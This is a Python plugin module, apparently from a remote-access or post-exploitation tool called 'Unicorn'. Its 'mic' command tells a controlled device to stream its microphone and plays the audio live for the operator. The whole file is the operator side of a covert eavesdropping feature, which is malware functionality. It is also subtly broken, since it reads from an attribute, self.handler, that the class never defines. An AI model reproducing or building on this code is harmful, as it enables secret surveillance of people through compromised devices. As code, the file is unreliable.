#!/usr/bin/env python3

import pyaudio

from core.badges import badges

class UnicornModule:
    def __init__(self, unicorn):
        self.unicorn = unicorn
        self.badges = badges()

        self.name = "mic"
        self.description = "Listen microphone sound."
        self.usage = "Usage: mic"
        self.type = "managing"
        self.args = 1

    def run(self, cmd_data):
        p = pyaudio.PyAudio()
        CHUNK = 1024 * 4
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        output=True,
                        frames_per_buffer=CHUNK)
        if self.unicorn.send_command(self.name) == "success":
            print(self.badges.G + "Listening...")
            print(self.badges.I + "Press Ctrl-C to stop.")
            while True:
                self.unicorn.send_request("continue", False)
                try:
                    data = self.handler.recvall(4096)
                    stream.write(data)
                except (KeyboardInterrupt, EOFError):
                    self.unicorn.send_request("break", False)
                    stream.stop_stream()
                    stream.close()
                    p.terminate()
                    return
        else:
            stream.stop_stream()
            stream.close()
            p.terminate()
            print(self.badges.E + "Failed to listen!")
            return
